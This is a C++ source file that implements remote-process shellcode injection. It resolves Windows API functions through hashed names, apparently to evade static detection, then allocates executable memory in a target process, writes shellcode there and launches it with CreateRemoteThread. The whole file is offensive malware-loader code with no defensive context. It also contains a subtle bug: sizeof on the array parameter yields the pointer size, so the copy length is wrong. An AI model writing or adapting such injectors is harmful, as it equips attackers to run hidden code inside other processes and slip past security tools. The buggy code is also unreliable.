#include "execute.hpp"

namespace hashes {
	constexpr ULONG kernel32 = HashString("KERNEL32.DLL");
	constexpr ULONG ntdll = HashString("NTDLL.DLL");
}

namespace execute {
	VOID CreateRemoteThread(_In_ DWORD PID, _In_ unsigned char Shellcode[])
	{
		HANDLE hProcess = NULL;
		PVOID pAddress = NULL;
		BOOL Success;
		HANDLE hThread = NULL;
		SIZE_T BytesWritten = 0;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;

		kernel32 = memory::GetModuleHandleC(hashes::kernel32);
		ntdll = memory::GetModuleHandleC(hashes::ntdll);

		typeOpenProcess pOpenProcess = (typeOpenProcess)memory::GetProcAddressC(kernel32, HashString("OpenProcess"));
		typeVirtualAllocEx pVirtualAllocEx = (typeVirtualAllocEx)memory::GetProcAddressC(kernel32, HashString("VirtualAllocEx"));
		typeWriteProcessMemory pWriteProcessMemory = (typeWriteProcessMemory)memory::GetProcAddressC(kernel32, HashString("WriteProcessMemory"));
		typeCreateRemoteThread pCreateRemoteThread = (typeCreateRemoteThread)memory::GetProcAddressC(kernel32, HashString("CreateRemoteThread"));

		hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		if (hProcess == NULL) {
			return ExitProcess(-1);
		}
		pAddress = pVirtualAllocEx(hProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		if (pAddress == NULL) {
			return ExitProcess(-2);
		}
		Success = pWriteProcessMemory(hProcess, pAddress, Shellcode, sizeof(Shellcode), &BytesWritten);
		if (!Success) {
			return ExitProcess(-3);
		}
		hThread = pCreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
		if (hThread == NULL) {
			return ExitProcess(-4);
		}
	}
} // End of execute namespace